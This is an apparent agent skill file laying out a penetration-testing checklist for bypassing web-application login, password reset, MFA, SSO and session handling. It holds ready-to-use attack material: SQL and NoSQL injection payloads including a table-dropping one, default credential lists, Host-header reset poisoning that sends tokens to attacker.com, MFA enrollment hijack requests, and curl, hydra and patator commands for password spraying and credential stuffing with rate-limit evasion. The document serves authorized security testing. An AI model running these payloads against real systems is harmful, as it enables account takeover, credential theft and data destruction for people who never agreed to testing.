---
name: offensive-auth-bypass
description: "Authentication bypass methodology — broken authentication patterns, password reset abuse (token predictability, host header injection in reset links, race conditions), MFA bypass (response manipulation, token reuse, alternate factors, recovery code abuse), brute force and credential stuffing with rate-limit evasion, default credential testing, SSO misconfigurations (SAML/OIDC), magic-link abuse, and session-fixation. Use when assessing the login surface — distinct from access control after login (see offensive-access-control)."
---

# Authentication Bypass

The login page is one of the most-tested surfaces in any web app — and one of the most consistently broken. Bypasses come from logic flaws, not crypto; the bug is usually in how the application validates state, not in how it stores passwords.

## Quick Workflow

1. Map every entry point: standard login, social login, SSO, magic link, password reset, MFA, account recovery
2. Test each for response-based bypass (status codes, redirect chains)
3. Test for token predictability and reuse
4. Test for race conditions on every "one-shot" check
5. Test alternate factors / recovery flows for shortcuts

---

## Login Form Bypasses

### Response Manipulation

```http
POST /login
{ "username": "admin", "password": "wrong" }

→ 401 { "error": "invalid" }
```

Try:
- Set the response status to 200 manually if there's a client-side check
- Modify response body to `{ "success": true, "token": "..." }`
- Change `Set-Cookie` from server response to forge a session

This works only when the client trusts response data without server validation — but it surfaces logic flaws when post-auth requests are made off cached client state.

### SQL Injection in Login

Classic, still finds bugs:

```
admin' --
admin' OR '1'='1
admin'/*
'; DROP TABLE users; --
```

See `offensive-sqli` for full coverage.

### NoSQL Injection

```http
POST /login
Content-Type: application/json

{ "username": "admin", "password": { "$ne": null } }
{ "username": { "$gt": "" }, "password": { "$gt": "" } }
{ "username": "admin", "password": { "$regex": "^a" } }
```

### Default Creds

Always try first:

| Service | Default |
|---|---|
| Tomcat manager | tomcat:tomcat, admin:admin, manager:manager |
| Jenkins | admin:admin (older), or first-run password in /var/jenkins_home |
| MongoDB | (no auth on legacy versions) |
| PostgreSQL | postgres:postgres |
| RabbitMQ | guest:guest |
| Grafana | admin:admin |
| Vendor admin panels | admin:<empty>, admin:vendor-name, admin:Password1 |

## Password Reset Abuse

### Host Header Injection in Reset Email

```http
POST /reset-password
Host: attacker.com
{ "email": "victim@target.com" }
```

If the app builds the reset URL from `Host:` and emails the user, the link points to `attacker.com/reset?token=X` — victim clicks, you grab the token.

Also test:
```
X-Forwarded-Host: attacker.com
X-Original-URL: https://attacker.com
X-Forwarded-Server: attacker.com
```

### Predictable Tokens

Reset tokens that are:
- Sequential (`?token=1001`, `?token=1002`)
- Time-based (Unix timestamp + email hash)
- MD5(email) — attacker generates token for any email
- UUIDv1 (timestamp-derived, predictable from timing)

Capture 5–10 of your own tokens, look for patterns.

### Race on Reset Token Use

Reset tokens often have "single use" enforcement that checks-then-marks-used non-atomically:

```http
# In parallel:
POST /reset-password { "token": "T", "newpw": "attacker1" }
POST /reset-password { "token": "T", "newpw": "attacker2" }
```

Both succeed, race-style. Some apps use the second value, some keep the first — both indicate the bug. See `offensive-race-condition`.

### Reset Token Disclosed in Response

Sometimes the API returns the token to the requesting client (for SPA convenience). Then any password reset = token disclosure to the caller.

```http
POST /api/account/reset-password
{ "email": "victim@target.com" }
→ { "ok": true, "token": "abc123" }
```

## MFA Bypass

### Response Manipulation

```http
POST /verify-mfa
{ "code": "000000" }

→ 401 { "ok": false, "error": "wrong" }
```

If the SPA processes the response as `if (data.ok) redirect('/dashboard')`, intercept and rewrite to `{ "ok": true }`. Works only when post-MFA requests don't re-validate server-side.

### MFA Skip Endpoint

After a successful login, the cookie/token might already grant access — the MFA step is client-side gating only:

```http
POST /login → cookie SESSIONID=abc; mfa_required=true
GET /api/dashboard
Cookie: SESSIONID=abc
→ 200 — works without MFA
```

### Alternate Factor Abuse

App offers MFA via TOTP, SMS, email backup, recovery codes. Find the weakest:

- SMS: SIM swap, social engineering, cellular signaling abuse
- Email: account compromise of the secondary email
- Recovery codes: usually 10 codes, sometimes leaked to logs / screenshots
- Backup security questions: OSINT-derivable

### Token Reuse / Race

OTP codes typically valid for 30s. If the lockout counter increments-on-failure non-atomically, race 30 attempts in parallel before the counter increments.

### MFA Setup-Flow Abuse

Account in "setup MFA" state — does the app require existing MFA before changing? Force-add your own TOTP via parameter manipulation:

```http
POST /api/user/mfa/enroll
Cookie: SESSIONID=victim_session
{ "secret": "<your_TOTP_secret>" }
```

If the enrollment endpoint doesn't require current-MFA verification, you've replaced their MFA with yours.

## Brute Force & Credential Stuffing

```bash
# Slow, low-volume password spray
for u in $(cat users.txt); do
  for p in 'Welcome1' 'Password1' 'Spring2025!'; do
    curl -X POST https://target.com/login \
      -d "user=$u&pass=$p" -o /dev/null -w "%{http_code} $u:$p\n"
    sleep 8
  done
done

# Hydra for higher volume (with authorization)
hydra -L users.txt -P passwords.txt target.com http-post-form \
  "/login:user=^USER^&pass=^PASS^:F=Invalid"
```

### Rate Limit Bypasses

Common ineffective rate limits:

| Limit Key | Bypass |
|---|---|
| Source IP | X-Forwarded-For rotation |
| Cookie | Drop / rotate cookies per attempt |
| User-Agent | Rotate UA per attempt |
| Endpoint specific (`/login`) | Use `/api/v2/login`, `/api/login`, casing variants |
| Session | New session per attempt |
| Username | Stuff against many usernames not just one |

### Credential Stuffing

Reusing credentials from previous breaches:

```bash
# Use a tested combo list
patator http_fuzz url=https://target.com/login \
  method=POST body='user=COMBO0&pass=COMBO1' \
  0=combo.txt -x ignore:code=200 -x ignore:fgrep="invalid"
```

## Magic Link Abuse

Magic links bypass passwords by emailing a token-bearing URL.

- Token reuse: does it expire on use?
- Token in URL → logs / Referer → leak to third parties
- Same flaw as password reset Host header injection

## SSO / Federation

### SAML

- Signature wrapping (XSW)
- Comment injection in NameID
- KeyInfo abuse — point to attacker key
- Replay of expired assertions

### OIDC / OAuth

- Open redirect in `redirect_uri`
- Missing state parameter → CSRF
- Implicit flow `id_token` accepted without nonce check
- Token swap: `access_token` vs `id_token` confusion

See `offensive-oauth` and the planned `offensive-saml-attacks`/`offensive-oidc-attacks` for depth.

## Session Fixation

Pre-set the session cookie before login; if the app doesn't rotate session ID on auth, attacker shares the post-login session.

```http
GET /login?sid=ATTACKER_KNOWN
# Victim logs in; session ID stays ATTACKER_KNOWN; attacker uses it
```

Test by setting `Set-Cookie` headers manually before login.

## Account Lockout / DoS as Auth Bypass

Lock out the legitimate user with N failed attempts, then password-reset their account through the unguarded reset flow → take over.

## Engagement Cheatsheet

```
[ ] Default creds against every login surface
[ ] SQL/NoSQL injection in login form
[ ] Response manipulation on login + MFA endpoints
[ ] Password reset:
    [ ] Host header injection
    [ ] Token predictability
    [ ] Race on token use
    [ ] Token disclosed in response
[ ] MFA:
    [ ] Skip via direct API call
    [ ] Response flip
    [ ] Alternate factor (recovery codes, email)
    [ ] Setup-flow abuse
[ ] Rate-limit bypass (IP rotation, alternate endpoints, casing)
[ ] Magic-link token reuse
[ ] SSO/SAML/OIDC misconfig
[ ] Session fixation (pre-set sid)
[ ] Lockout-then-reset takeover
```

---

## Key References

- OWASP ASVS V2 (Authentication)
- OWASP WSTG-ATHN
- "Authentication and Authorization in REST APIs" (Auth0, Okta blogs)
- Source: https://github.com/SnailSploit/offensive-checklist/blob/main/auth-bypass.md
